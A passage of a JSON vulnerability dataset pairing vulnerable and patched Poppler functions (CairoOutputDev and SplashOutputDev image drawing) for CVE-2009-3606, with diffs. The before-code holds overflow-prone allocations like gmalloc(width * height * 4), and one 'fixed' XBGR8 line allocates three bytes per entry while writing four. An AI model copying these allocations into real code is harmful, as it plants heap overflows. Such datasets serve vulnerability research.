(pattern);\n  cairo_surface_destroy (image);\n  free (buffer);\n  delete imgStr;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -14,7 +14,7 @@\n   cairo_matrix_t matrix;\n   int is_identity_transform;\n   \n-  buffer = (unsigned char *)gmalloc (width * height * 4);\n+  buffer = (unsigned char *)gmallocn3 (width, height, 4);\n \n   /* TODO: Do we want to cache these? */\n   imgStr = new ImageStream(str, width,",
        "diff_line_info": {
            "deleted_lines": [
                "  buffer = (unsigned char *)gmalloc (width * height * 4);"
            ],
            "added_lines": [
                "  buffer = (unsigned char *)gmallocn3 (width, height, 4);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/CairoOutputDev::drawSoftMaskedImage",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void CairoOutputDev::drawSoftMaskedImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tStream *maskStr,\n\t\t\t\tint maskWidth, int maskHeight,\n\t\t\t\tGfxImageColorMap *maskColorMap)\n{\n  ImageStream *maskImgStr;\n  maskImgStr = new ImageStream(maskStr, maskWidth,\n\t\t\t\t       maskColorMap->getNumPixelComps(),\n\t\t\t\t       maskColorMap->getBits());\n  maskImgStr->reset();\n\n  int row_stride = (maskWidth + 3) & ~3;\n  unsigned char *maskBuffer;\n  maskBuffer = (unsigned char *)gmalloc (row_stride * maskHeight);\n  unsigned char *maskDest;\n  cairo_surface_t *maskImage;\n  cairo_pattern_t *maskPattern;\n  Guchar *pix;\n  int y;\n  for (y = 0; y < maskHeight; y++) {\n    maskDest = (unsigned char *) (maskBuffer + y * row_stride);\n    pix = maskImgStr->getLine();\n    maskColorMap->getGrayLine (pix, maskDest, maskWidth);\n  }\n\n  maskImage = cairo_image_surface_create_for_data (maskBuffer, CAIRO_FORMAT_A8,\n\t\t\t\t\t\t maskWidth, maskHeight, row_stride);\n\n  delete maskImgStr;\n  maskStr->close();\n\n  unsigned char *buffer;\n  unsigned int *dest;\n  cairo_surface_t *image;\n  cairo_pattern_t *pattern;\n  ImageStream *imgStr;\n  cairo_matrix_t matrix;\n  cairo_matrix_t maskMatrix;\n  int is_identity_transform;\n\n  buffer = (unsigned char *)gmalloc (width * height * 4);\n\n  /* TODO: Do we want to cache these? */\n  imgStr = new ImageStream(str, width,\n\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n  \n  /* ICCBased color space doesn't do any color correction\n   * so check its underlying color space as well */\n  is_identity_transform = colorMap->getColorSpace()->getMode() == csDeviceRGB ||\n\t\t  (colorMap->getColorSpace()->getMode() == csICCBased && \n\t\t   ((GfxICCBasedColorSpace*)colorMap->getColorSpace())->getAlt()->getMode() == csDeviceRGB);\n\n  for (y = 0; y < height; y++) {\n    dest = (unsigned int *) (buffer + y * 4 * width);\n    pix = imgStr->getLine();\n    colorMap->getRGBLine (pix, dest, width);\n  }\n\n  image = cairo_image_surface_create_for_data (buffer, CAIRO_FORMAT_RGB24,\n\t\t\t\t\t\t width, height, width * 4);\n\n  if (image == NULL) {\n    delete imgStr;\n    return;\n  }\n  pattern = cairo_pattern_create_for_surface (image);\n  maskPattern = cairo_pattern_create_for_surface (maskImage);\n  if (pattern == NULL) {\n    delete imgStr;\n    return;\n  }\n\n  LOG (printf (\"drawSoftMaskedImage %dx%d\\n\", width, height));\n\n  cairo_matrix_init_translate (&matrix, 0, height);\n  cairo_matrix_scale (&matrix, width, -height);\n\n  cairo_matrix_init_translate (&maskMatrix, 0, maskHeight);\n  cairo_matrix_scale (&maskMatrix, maskWidth, -maskHeight);\n\n  cairo_pattern_set_matrix (pattern, &matrix);\n  cairo_pattern_set_matrix (maskPattern, &maskMatrix);\n\n  //XXX: should set mask filter\n  cairo_pattern_set_filter (pattern, CAIRO_FILTER_BILINEAR);\n  cairo_pattern_set_filter (maskPattern, CAIRO_FILTER_BILINEAR);\n  cairo_set_source (cairo, pattern);\n  cairo_mask (cairo, maskPattern);\n\n  if (cairo_shape) {\n#if 0\n    cairo_rectangle (cairo_shape, 0., 0., width, height);\n    cairo_fill (cairo_shape);\n#else\n    cairo_save (cairo_shape);\n    /* this should draw a rectangle the size of the image\n     * we use this instead of rect,fill because of the lack\n     * of EXTEND_PAD */\n    /* NOTE: this will multiply the edges of the image twice */\n    cairo_set_source (cairo_shape, pattern);\n    cairo_mask (cairo_shape, pattern);\n    cairo_restore (cairo_shape);\n#endif\n  }\n\n  cairo_pattern_destroy (maskPattern);\n  cairo_surface_destroy (maskImage);\n  cairo_pattern_destroy (pattern);\n  cairo_surface_destroy (image);\n  free (buffer);\n  free (maskBuffer);\n\n  delete imgStr;\n}",
        "func": "void CairoOutputDev::drawSoftMaskedImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tStream *maskStr,\n\t\t\t\tint maskWidth, int maskHeight,\n\t\t\t\tGfxImageColorMap *maskColorMap)\n{\n  ImageStream *maskImgStr;\n  maskImgStr = new ImageStream(maskStr, maskWidth,\n\t\t\t\t       maskColorMap->getNumPixelComps(),\n\t\t\t\t       maskColorMap->getBits());\n  maskImgStr->reset();\n\n  int row_stride = (maskWidth + 3) & ~3;\n  unsigned char *maskBuffer;\n  maskBuffer = (unsigned char *)gmallocn (row_stride, maskHeight);\n  unsigned char *maskDest;\n  cairo_surface_t *maskImage;\n  cairo_pattern_t *maskPattern;\n  Guchar *pix;\n  int y;\n  for (y = 0; y < maskHeight; y++) {\n    maskDest = (unsigned char *) (maskBuffer + y * row_stride);\n    pix = maskImgStr->getLine();\n    maskColorMap->getGrayLine (pix, maskDest, maskWidth);\n  }\n\n  maskImage = cairo_image_surface_create_for_data (maskBuffer, CAIRO_FORMAT_A8,\n\t\t\t\t\t\t maskWidth, maskHeight, row_stride);\n\n  delete maskImgStr;\n  maskStr->close();\n\n  unsigned char *buffer;\n  unsigned int *dest;\n  cairo_surface_t *image;\n  cairo_pattern_t *pattern;\n  ImageStream *imgStr;\n  cairo_matrix_t matrix;\n  cairo_matrix_t maskMatrix;\n  int is_identity_transform;\n\n  buffer = (unsigned char *)gmallocn3 (width, height, 4);\n\n  /* TODO: Do we want to cache these? */\n  imgStr = new ImageStream(str, width,\n\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n  \n  /* ICCBased color space doesn't do any color correction\n   * so check its underlying color space as well */\n  is_identity_transform = colorMap->getColorSpace()->getMode() == csDeviceRGB ||\n\t\t  (colorMap->getColorSpace()->getMode() == csICCBased && \n\t\t   ((GfxICCBasedColorSpace*)colorMap->getColorSpace())->getAlt()->getMode() == csDeviceRGB);\n\n  for (y = 0; y < height; y++) {\n    dest = (unsigned int *) (buffer + y * 4 * width);\n    pix = imgStr->getLine();\n    colorMap->getRGBLine (pix, dest, width);\n  }\n\n  image = cairo_image_surface_create_for_data (buffer, CAIRO_FORMAT_RGB24,\n\t\t\t\t\t\t width, height, width * 4);\n\n  if (image == NULL) {\n    delete imgStr;\n    return;\n  }\n  pattern = cairo_pattern_create_for_surface (image);\n  maskPattern = cairo_pattern_create_for_surface (maskImage);\n  if (pattern == NULL) {\n    delete imgStr;\n    return;\n  }\n\n  LOG (printf (\"drawSoftMaskedImage %dx%d\\n\", width, height));\n\n  cairo_matrix_init_translate (&matrix, 0, height);\n  cairo_matrix_scale (&matrix, width, -height);\n\n  cairo_matrix_init_translate (&maskMatrix, 0, maskHeight);\n  cairo_matrix_scale (&maskMatrix, maskWidth, -maskHeight);\n\n  cairo_pattern_set_matrix (pattern, &matrix);\n  cairo_pattern_set_matrix (maskPattern, &maskMatrix);\n\n  //XXX: should set mask filter\n  cairo_pattern_set_filter (pattern, CAIRO_FILTER_BILINEAR);\n  cairo_pattern_set_filter (maskPattern, CAIRO_FILTER_BILINEAR);\n  cairo_set_source (cairo, pattern);\n  cairo_mask (cairo, maskPattern);\n\n  if (cairo_shape) {\n#if 0\n    cairo_rectangle (cairo_shape, 0., 0., width, height);\n    cairo_fill (cairo_shape);\n#else\n    cairo_save (cairo_shape);\n    /* this should draw a rectangle the size of the image\n     * we use this instead of rect,fill because of the lack\n     * of EXTEND_PAD */\n    /* NOTE: this will multiply the edges of the image twice */\n    cairo_set_source (cairo_shape, pattern);\n    cairo_mask (cairo_shape, pattern);\n    cairo_restore (cairo_shape);\n#endif\n  }\n\n  cairo_pattern_destroy (maskPattern);\n  cairo_surface_destroy (maskImage);\n  cairo_pattern_destroy (pattern);\n  cairo_surface_destroy (image);\n  free (buffer);\n  free (maskBuffer);\n\n  delete imgStr;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -13,7 +13,7 @@\n \n   int row_stride = (maskWidth + 3) & ~3;\n   unsigned char *maskBuffer;\n-  maskBuffer = (unsigned char *)gmalloc (row_stride * maskHeight);\n+  maskBuffer = (unsigned char *)gmallocn (row_stride, maskHeight);\n   unsigned char *maskDest;\n   cairo_surface_t *maskImage;\n   cairo_pattern_t *maskPattern;\n@@ -40,7 +40,7 @@\n   cairo_matrix_t maskMatrix;\n   int is_identity_transform;\n \n-  buffer = (unsigned char *)gmalloc (width * height * 4);\n+  buffer = (unsigned char *)gmallocn3 (width, height, 4);\n \n   /* TODO: Do we want to cache these? */\n   imgStr = new ImageStream(str, width,",
        "diff_line_info": {
            "deleted_lines": [
                "  maskBuffer = (unsigned char *)gmalloc (row_stride * maskHeight);",
                "  buffer = (unsigned char *)gmalloc (width * height * 4);"
            ],
            "added_lines": [
                "  maskBuffer = (unsigned char *)gmallocn (row_stride, maskHeight);",
                "  buffer = (unsigned char *)gmallocn3 (width, height, 4);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/SplashOutputDev::drawImage",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void SplashOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg) {\n  double *ctm;\n  SplashCoord mat[6];\n  SplashOutImageData imgData;\n  SplashColorMode srcMode;\n  SplashImageSource src;\n  GfxGray gray;\n  GfxRGB rgb;\n#if SPLASH_CMYK\n  GfxCMYK cmyk;\n#endif\n  Guchar pix;\n  int n, i;\n\n  ctm = state->getCTM();\n  mat[0] = ctm[0];\n  mat[1] = ctm[1];\n  mat[2] = -ctm[2];\n  mat[3] = -ctm[3];\n  mat[4] = ctm[2] + ctm[4];\n  mat[5] = ctm[3] + ctm[5];\n\n  imgData.imgStr = new ImageStream(str, width,\n\t\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t\t   colorMap->getBits());\n  imgData.imgStr->reset();\n  imgData.colorMap = colorMap;\n  imgData.maskColors = maskColors;\n  imgData.colorMode = colorMode;\n  imgData.width = width;\n  imgData.height = height;\n  imgData.y = 0;\n\n  // special case for one-channel (monochrome/gray/separation) images:\n  // build a lookup table here\n  imgData.lookup = NULL;\n  if (colorMap->getNumPixelComps() == 1) {\n    n = 1 << colorMap->getBits();\n    switch (colorMode) {\n    case splashModeMono1:\n    case splashModeMono8:\n      imgData.lookup = (SplashColorPtr)gmalloc(n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getGray(&pix, &gray);\n\timgData.lookup[i] = colToByte(gray);\n      }\n      break;\n    case splashModeRGB8:\n    case splashModeBGR8:\n      imgData.lookup = (SplashColorPtr)gmalloc(3 * n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[3*i] = colToByte(rgb.r);\n\timgData.lookup[3*i+1] = colToByte(rgb.g);\n\timgData.lookup[3*i+2] = colToByte(rgb.b);\n      }\n      break;\n    case splashModeXBGR8:\n      imgData.lookup = (SplashColorPtr)gmalloc(4 * n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[4*i] = colToByte(rgb.r);\n\timgData.lookup[4*i+1] = colToByte(rgb.g);\n\timgData.lookup[4*i+2] = colToByte(rgb.b);\n\timgData.lookup[4*i+3] = 255;\n      }\n      break;\n#if SPLASH_CMYK\n    case splashModeCMYK8:\n      imgData.lookup = (SplashColorPtr)gmalloc(4 * n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getCMYK(&pix, &cmyk);\n\timgData.lookup[4*i] = colToByte(cmyk.c);\n\timgData.lookup[4*i+1] = colToByte(cmyk.m);\n\timgData.lookup[4*i+2] = colToByte(cmyk.y);\n\timgData.lookup[4*i+3] = colToByte(cmyk.k);\n      }\n      break;\n#endif\n      break;\n    }\n  }\n\n  if (colorMode == splashModeMono1) {\n    srcMode = splashModeMono8;\n  } else {\n    srcMode = colorMode;\n  }\n  src = maskColors ? &alphaImageSrc : &imageSrc;\n  splash->drawImage(src, &imgData, srcMode, maskColors ? gTrue : gFalse,\n\t\t    width, height, mat);\n  if (inlineImg) {\n    while (imgData.y < height) {\n      imgData.imgStr->getLine();\n      ++imgData.y;\n    }\n  }\n\n  gfree(imgData.lookup);\n  delete imgData.imgStr;\n  str->close();\n}",
        "func": "void SplashOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg) {\n  double *ctm;\n  SplashCoord mat[6];\n  SplashOutImageData imgData;\n  SplashColorMode srcMode;\n  SplashImageSource src;\n  GfxGray gray;\n  GfxRGB rgb;\n#if SPLASH_CMYK\n  GfxCMYK cmyk;\n#endif\n  Guchar pix;\n  int n, i;\n\n  ctm = state->getCTM();\n  mat[0] = ctm[0];\n  mat[1] = ctm[1];\n  mat[2] = -ctm[2];\n  mat[3] = -ctm[3];\n  mat[4] = ctm[2] + ctm[4];\n  mat[5] = ctm[3] + ctm[5];\n\n  imgData.imgStr = new ImageStream(str, width,\n\t\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t\t   colorMap->getBits());\n  imgData.imgStr->reset();\n  imgData.colorMap = colorMap;\n  imgData.maskColors = maskColors;\n  imgData.colorMode = colorMode;\n  imgData.width = width;\n  imgData.height = height;\n  imgData.y = 0;\n\n  // special case for one-channel (monochrome/gray/separation) images:\n  // build a lookup table here\n  imgData.lookup = NULL;\n  if (colorMap->getNumPixelComps() == 1) {\n    n = 1 << colorMap->getBits();\n    switch (colorMode) {\n    case splashModeMono1:\n    case splashModeMono8:\n      imgData.lookup = (SplashColorPtr)gmalloc(n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getGray(&pix, &gray);\n\timgData.lookup[i] = colToByte(gray);\n      }\n      break;\n    case splashModeRGB8:\n    case splashModeBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[3*i] = colToByte(rgb.r);\n\timgData.lookup[3*i+1] = colToByte(rgb.g);\n\timgData.lookup[3*i+2] = colToByte(rgb.b);\n      }\n      break;\n    case splashModeXBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[4*i] = colToByte(rgb.r);\n\timgData.lookup[4*i+1] = colToByte(rgb.g);\n\timgData.lookup[4*i+2] = colToByte(rgb.b);\n\timgData.lookup[4*i+3] = 255;\n      }\n      break;\n#if SPLASH_CMYK\n    case splashModeCMYK8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getCMYK(&pix, &cmyk);\n\timgData.lookup[4*i] = colToByte(cmyk.c);\n\timgData.lookup[4*i+1] = colToByte(cmyk.m);\n\timgData.lookup[4*i+2] = colToByte(cmyk.y);\n\timgData.lookup[4*i+3] = colToByte(cmyk.k);\n      }\n      break;\n#endif\n      break;\n    }\n  }\n\n  if (colorMode == splashModeMono1) {\n    srcMode = splashModeMono8;\n  } else {\n    srcMode = colorMode;\n  }\n  src = maskColors ? &alphaImageSrc : &imageSrc;\n  splash->drawImage(src, &imgData, srcMode, maskColors ? gTrue : gFalse,\n\t\t    width, height, mat);\n  if (inlineImg) {\n    while (imgData.y < height) {\n      imgData.imgStr->getLine();\n      ++imgData.y;\n    }\n  }\n\n  gfree(imgData.lookup);\n  delete imgData.imgStr;\n  str->close();\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -51,7 +51,7 @@\n       break;\n     case splashModeRGB8:\n     case splashModeBGR8:\n-      imgData.lookup = (SplashColorPtr)gmalloc(3 * n);\n+      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n       for (i = 0; i < n; ++i) {\n \tpix = (Guchar)i;\n \tcolorMap->getRGB(&pix, &rgb);\n@@ -61,7 +61,7 @@\n       }\n       break;\n     case splashModeXBGR8:\n-      imgData.lookup = (SplashColorPtr)gmalloc(4 * n);\n+      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n       for (i = 0; i < n; ++i) {\n \tpix = (Guchar)i;\n \tcolorMap->getRGB(&pix, &rgb);\n@@ -73,7 +73,7 @@\n       break;\n #if SPLASH_CMYK\n     case splashModeCMYK8:\n-      imgData.lookup = (SplashColorPtr)gmalloc(4 * n);\n+      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n       for (i = 0; i < n; ++i) {\n \tpix = (Guchar)i;\n \tcolorMap->getCMYK(&pix, &cmyk);",
        "diff_line_info": {
            "deleted_lines": [
                "      imgData.lookup = (SplashColorPtr)gmalloc(3 * n);",
                "      imgData.lookup = (SplashColorPtr)gmalloc(4 * n);",
                "      imgData.lookup = (SplashColorPtr)gmalloc(4 * n);"
            ],
            "added_lines": [
                "      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);",
                "      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);",
                "      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-3606",
        "func_name": "poppler/SplashOutputDev::drawSoftMaskedImage",
        "description": "Integer overflow in the PSOutputDev::doImageL1Sep function in Xpdf before 3.02pl4, and Poppler 0.x, as used in kdegraphics KPDF, might allow remote attackers to execute arbitrary code via a crafted PDF document that triggers a heap-based buffer overflow.",
        "git_url": "http://cgit.freedesktop.org/poppler/poppler/commit/poppler/PSOutputDev.cc?id=7b2d314a61",
        "commit_title": "",
        "commit_text": "",
        "func_before": "void SplashOutputDev::drawSoftMaskedImage(GfxState *state, Object *ref,\n\t\t\t\t\t  Stream *str, int width, int height,\n\t\t\t\t\t  GfxImageColorMap *colorMap,\n\t\t\t\t\t  Stream *maskStr,\n\t\t\t\t\t  int maskWidth, int maskHeight,\n\t\t\t\t\t  GfxImageColorMap *maskColorMap) {\n  double *ctm;\n  SplashCoord mat[6];\n  SplashOutImageData imgData;\n  SplashOutImageData imgMaskData;\n  SplashColorMode srcMode;\n  SplashBitmap *maskBitmap;\n  Splash *maskSplash;\n  SplashColor maskColor;\n  GfxGray gray;\n  GfxRGB rgb;\n#if SPLASH_CMYK\n  GfxCMYK cmyk;\n#endif\n  Guchar pix;\n  int n, i;\n\n  ctm = state->getCTM();\n  mat[0] = ctm[0];\n  mat[1] = ctm[1];\n  mat[2] = -ctm[2];\n  mat[3] = -ctm[3];\n  mat[4] = ctm[2] + ctm[4];\n  mat[5] = ctm[3] + ctm[5];\n\n  //----- set up the soft mask\n\n  imgMaskData.imgStr = new ImageStream(maskStr, maskWidth,\n\t\t\t\t       maskColorMap->getNumPixelComps(),\n\t\t\t\t       maskColorMap->getBits());\n  imgMaskData.imgStr->reset();\n  imgMaskData.colorMap = maskColorMap;\n  imgMaskData.maskColors = NULL;\n  imgMaskData.colorMode = splashModeMono8;\n  imgMaskData.width = maskWidth;\n  imgMaskData.height = maskHeight;\n  imgMaskData.y = 0;\n  n = 1 << maskColorMap->getBits();\n  imgMaskData.lookup = (SplashColorPtr)gmalloc(n);\n  for (i = 0; i < n; ++i) {\n    pix = (Guchar)i;\n    maskColorMap->getGray(&pix, &gray);\n    imgMaskData.lookup[i] = colToByte(gray);\n  }\n  maskBitmap = new SplashBitmap(bitmap->getWidth(), bitmap->getHeight(),\n\t\t\t\t1, splashModeMono8, gFalse);\n  maskSplash = new Splash(maskBitmap, vectorAntialias);\n  maskColor[0] = 0;\n  maskSplash->clear(maskColor);\n  maskSplash->drawImage(&imageSrc, &imgMaskData, splashModeMono8, gFalse,\n\t\t\tmaskWidth, maskHeight, mat);\n  delete imgMaskData.imgStr;\n  maskStr->close();\n  gfree(imgMaskData.lookup);\n  delete maskSplash;\n  splash->setSoftMask(maskBitmap);\n\n  //----- draw the source image\n\n  imgData.imgStr = new ImageStream(str, width,\n\t\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t\t   colorMap->getBits());\n  imgData.imgStr->reset();\n  imgData.colorMap = colorMap;\n  imgData.maskColors = NULL;\n  imgData.colorMode = colorMode;\n  imgData.width = width;\n  imgData.height = height;\n  imgData.y = 0;\n\n  // special case for one-channel (monochrome/gray/separation) images:\n  // build a lookup table here\n  imgData.lookup = NULL;\n  if (colorMap->getNumPixelComps() == 1) {\n    n = 1 << colorMap->getBits();\n    switch (colorMode) {\n    case splashModeMono1:\n    case splashModeMono8:\n      imgData.lookup = (SplashColorPtr)gmalloc(n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getGray(&pix, &gray);\n\timgData.lookup[i] = colToByte(gray);\n      }\n      break;\n    case splashModeRGB8:\n    case splashModeBGR8:\n      imgData.lookup = (SplashColorPtr)gmalloc(3 * n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[3*i] = colToByte(rgb.r);\n\timgData.lookup[3*i+1] = colToByte(rgb.g);\n\timgData.lookup[3*i+2] = colToByte(rgb.b);\n      }\n      break;\n    case splashModeXBGR8:\n      imgData.lookup = (SplashColorPtr)gmalloc(4 * n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[4*i] = colToByte(rgb.r);\n\timgData.lookup[4*i+1] = colToByte(rgb.g);\n\timgData.lookup[4*i+2] = colToByte(rgb.b);\n\timgData.lookup[4*i+3] = 255;\n      }\n      break;\n#if SPLASH_CMYK\n    case splashModeCMYK8:\n      imgData.lookup = (SplashColorPtr)gmalloc(4 * n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getCMYK(&pix, &cmyk);\n\timgData.lookup[4*i] = colToByte(cmyk.c);\n\timgData.lookup[4*i+1] = colToByte(cmyk.m);\n\timgData.lookup[4*i+2] = colToByte(cmyk.y);\n\timgData.lookup[4*i+3] = colToByte(cmyk.k);\n      }\n      break;\n#endif\n    }\n  }\n\n  if (colorMode == splashModeMono1) {\n    srcMode = splashModeMono8;\n  } else {\n    srcMode = colorMode;\n  }\n  splash->drawImage(&imageSrc, &imgData, srcMode, gFalse, width, height, mat);\n\n  splash->setSoftMask(NULL);\n  gfree(imgData.lookup);\n  delete imgData.imgStr;\n  str->close();\n}",
        "func": "void SplashOutputDev::drawSoftMaskedImage(GfxState *state, Object *ref,\n\t\t\t\t\t  Stream *str, int width, int height,\n\t\t\t\t\t  GfxImageColorMap *colorMap,\n\t\t\t\t\t  Stream *maskStr,\n\t\t\t\t\t  int maskWidth, int maskHeight,\n\t\t\t\t\t  GfxImageColorMap *maskColorMap) {\n  double *ctm;\n  SplashCoord mat[6];\n  SplashOutImageData imgData;\n  SplashOutImageData imgMaskData;\n  SplashColorMode srcMode;\n  SplashBitmap *maskBitmap;\n  Splash *maskSplash;\n  SplashColor maskColor;\n  GfxGray gray;\n  GfxRGB rgb;\n#if SPLASH_CMYK\n  GfxCMYK cmyk;\n#endif\n  Guchar pix;\n  int n, i;\n\n  ctm = state->getCTM();\n  mat[0] = ctm[0];\n  mat[1] = ctm[1];\n  mat[2] = -ctm[2];\n  mat[3] = -ctm[3];\n  mat[4] = ctm[2] + ctm[4];\n  mat[5] = ctm[3] + ctm[5];\n\n  //----- set up the soft mask\n\n  imgMaskData.imgStr = new ImageStream(maskStr, maskWidth,\n\t\t\t\t       maskColorMap->getNumPixelComps(),\n\t\t\t\t       maskColorMap->getBits());\n  imgMaskData.imgStr->reset();\n  imgMaskData.colorMap = maskColorMap;\n  imgMaskData.maskColors = NULL;\n  imgMaskData.colorMode = splashModeMono8;\n  imgMaskData.width = maskWidth;\n  imgMaskData.height = maskHeight;\n  imgMaskData.y = 0;\n  n = 1 << maskColorMap->getBits();\n  imgMaskData.lookup = (SplashColorPtr)gmalloc(n);\n  for (i = 0; i < n; ++i) {\n    pix = (Guchar)i;\n    maskColorMap->getGray(&pix, &gray);\n    imgMaskData.lookup[i] = colToByte(gray);\n  }\n  maskBitmap = new SplashBitmap(bitmap->getWidth(), bitmap->getHeight(),\n\t\t\t\t1, splashModeMono8, gFalse);\n  maskSplash = new Splash(maskBitmap, vectorAntialias);\n  maskColor[0] = 0;\n  maskSplash->clear(maskColor);\n  maskSplash->drawImage(&imageSrc, &imgMaskData, splashModeMono8, gFalse,\n\t\t\tmaskWidth, maskHeight, mat);\n  delete imgMaskData.imgStr;\n  maskStr->close();\n  gfree(imgMaskData.lookup);\n  delete maskSplash;\n  splash->setSoftMask(maskBitmap);\n\n  //----- draw the source image\n\n  imgData.imgStr = new ImageStream(str, width,\n\t\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t\t   colorMap->getBits());\n  imgData.imgStr->reset();\n  imgData.colorMap = colorMap;\n  imgData.maskColors = NULL;\n  imgData.colorMode = colorMode;\n  imgData.width = width;\n  imgData.height = height;\n  imgData.y = 0;\n\n  // special case for one-channel (monochrome/gray/separation) images:\n  // build a lookup table here\n  imgData.lookup = NULL;\n  if (colorMap->getNumPixelComps() == 1) {\n    n = 1 << colorMap->getBits();\n    switch (colorMode) {\n    case splashModeMono1:\n    case splashModeMono8:\n      imgData.lookup = (SplashColorPtr)gmalloc(n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getGray(&pix, &gray);\n\timgData.lookup[i] = colToByte(gray);\n      }\n      break;\n    case splashModeRGB8:\n    case splashModeBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[3*i] = colToByte(rgb.r);\n\timgData.lookup[3*i+1] = colToByte(rgb.g);\n\timgData.lookup[3*i+2] = colToByte(rgb.b);\n      }\n      break;\n    case splashModeXBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[4*i] = colToByte(rgb.r);\n\timgData.lookup[4*i+1] = colToByte(rgb.g);\n\timgData.lookup[4*i+2] = colToByte(rgb.b);\n\timgData.lookup[4*i+3] = 255;\n      }\n      break;\n#if SPLASH_CMYK\n    case splashModeCMYK8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getCMYK(&pix, &cmyk);\n\timgData.lookup[4*i] = colToByte(cmyk.c);\n\timgData.lookup[4*i+1] = colToByte(cmyk.m);\n\timgData.lookup[4*i+2] = colToByte(cmyk.y);\n\timgData.lookup[4*i+3] = colToByte(cmyk.k);\n      }\n      break;\n#endif\n    }\n  }\n\n  if (colorMode == splashModeMono1) {\n    srcMode = splashModeMono8;\n  } else {\n    srcMode = colorMode;\n  }\n  splash->drawImage(&imageSrc, &imgData, srcMode, gFalse, width, height, mat);\n\n  splash->setSoftMask(NULL);\n  gfree(imgData.lookup);\n  delete imgData.imgStr;\n  str->close();\n}",
